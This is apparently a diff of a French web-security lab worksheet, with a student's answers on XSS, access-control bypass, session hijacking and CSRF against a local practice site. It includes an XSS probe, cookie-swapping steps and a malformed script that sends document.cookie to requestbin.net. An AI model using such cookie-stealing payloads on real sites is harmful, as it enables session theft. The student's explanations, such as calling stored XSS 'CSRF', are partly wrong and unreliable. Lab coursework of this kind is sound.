@@ -92,34 +92,71 @@ Les exercices qui suivent ont pour but de comprendre les mécanismes de plusieu
 
 #### 2. Cross-site scripting (XSS)
 
-   * [ ]  Proposez un moyen par lequel réaliser une attaque XSS sur le site
+   * [ ] Proposez un moyen par lequel réaliser une attaque XSS sur le site
 
-   * [ ]  A quoi pourrait servir une attaque XSS pour un pirate. Donnez des exemples de code d’attaque le cas échéant
+     Envoyer un message avec le contenu : `<script>alert("coucou")</script>`
+
+   * [ ] A quoi pourrait servir une attaque XSS pour un pirate. Donnez des exemples de code d’attaque le cas échéant
+
+     Un pirate peut stocker du code actif sur le serveur. Aux moments où le client demande une ressource au niveau de serveur. Et puis le client va exécuter du code malveillant à son insu pour voler de l'info notamment au travers des cookies. Les cookies sont souvent la cible d'une attaque xss.Example:
 
    * [ ]  Dans le cas où votre navigateur bloque le XSS, cela signifie-t-il que le site est protégé du XSS ?
 
-#### 3. Violation de** **contrôle d’accès
+#### 3. Violation de contrôle d’accès
 
    Citez les faiblesses que comporte, selon vous, cette application au niveau :
 
    - \-  du système d’authentification par login et mot de passe
+
+     http://localhost:8888/sr03p20/vw_moncompte.php
+
+     Après avoir effacé les cookies de votre navigateur, vous pouvez accéder directement à cette URL, vous pouvez vous connecter en tant qu'utilisateur anonyme et vous pouvez transférer de l'argent sur votre compte existant.
+
+     ![Imgur](https://i.imgur.com/4yEOrrU.png)
+
    - \-  du système de contrôle d’accès
+
+     Je peux accéder directement à l'interface d'administration en modifiant l'URL, même si l'utilisateur n'est pas administrateur.
+
+     http://localhost:8888/sr03p20/vw_moncompte.php/admin
+
+     <img src="https://i.imgur.com/XUZYfHU.png" alt="Imgur" style="zoom:50%;" />
+
    - \-  des références directes
 
 #### 4. **Violation de gestion de session**
 
-   * [ ]  Connectez-vous au site sur un navigateur avec un utilisateur X, puis tentez d’accéder à la session en cours de cet utilisateur X depuis un autre navigateur, sans avoir recours au login et mot de passe.
+   * [x]  Connectez-vous au site sur un navigateur avec un utilisateur X, puis tentez d’accéder à la session en cours de cet utilisateur X depuis un autre navigateur, sans avoir recours au login et mot de passe.
 
-   * [ ]  Décrivez les étapes par lesquelles vous êtes passé pour arriver à ce résultat.
+   * [x] Décrivez les étapes par lesquelles vous êtes passé pour arriver à ce résultat.
+
+      1. Besoin de garder deux comptes en ligne en même temps
+
+      2. Utiliser la fenêtre de navigateur privé
+
+      3. Copiez l'ID de session dans le cookie de l'utilisateur A, puis utilisez l’inspecte de Chrome pour modifier le cookie sur la page d'accueil de l'utilisateur B, puis mettez-le à jour.
+
+         <img src="https://i.imgur.com/h6DUjEp.png" alt="Imgur" style="zoom: 50%;" />
 
    * [ ]  Observez ce qui se passe si des actions sont réalisées dans les deux navigateurs en parallèle. Qu’en
 
       déduisez-vous ?
+      
+      ça veut dire quoi?
 
 #### 5. **Falsification de requête (CSRF)**
 
-   * [ ]  Donnez une fonctionnalité du site susceptible d’être la cible d’une attaque CSRF
-   * [ ]  Proposez un moyen par lequel réaliser une telle attaque
+   * [ ] Donnez une fonctionnalité du site susceptible d’être la cible d’une attaque CSRF
+
+     Les victimes peuvent être des administrateurs de site web.Le pirate peut voler le mot de passe de l’admin en envoyant du code malveillant dans la formulaire de message. Une fois que l'administrateur se connecte pour regarder le message, son cookie va être automatiquement transféré vers le pirate.
+
+   * [ ] Proposez un moyen par lequel réaliser une telle attaque
+
+     http://requestbin.net/ —— un site web pour récupérer la réponse lorsque l'admin se connecte.
+
+     ```javascript
+     <script>document.write("<img src=url.concat(document.cookie).concat("/>"))</script>
+     ```
 
 #### 6. **Vulnérabilité d'un composant**
 
@@ -133,12 +170,27 @@ Les exercices qui suivent ont pour but de comprendre les mécanismes de plusieu
 
    Donnez un exemple de problème que peut causer la possibilité d’accès aux répertoires par http dans le cas de notre exemple sr03p20.
 
+​	Le propriétaire du dossier n'est pas www-data
+
+![Imgur](https://i.imgur.com/3P8OLmW.png)
+
 #### 9. **Scripts de redirection**
 
    1. Inspectez le code de notre site pour repérer les éventuelles instructions de redirection non contrôlées.
    2. Donnez une façon d’exploiter l’une de ces redirections non contrôlées.
 
+
+
+
+
+
+
+
+
+
+
 ### C. Simulation d’un scénario d’attaque
+
 Présenter un exemple de scénario d'attaque complet d’usurpation de session d’un utilisateur sur le site sr03p20.
 On suppose que l’attaquant n’a pas accès à l’ordinateur de sa victime.
 Vous pourrez pour cet exercice : présenter un site pirate, générer des mails frauduleux, etc...
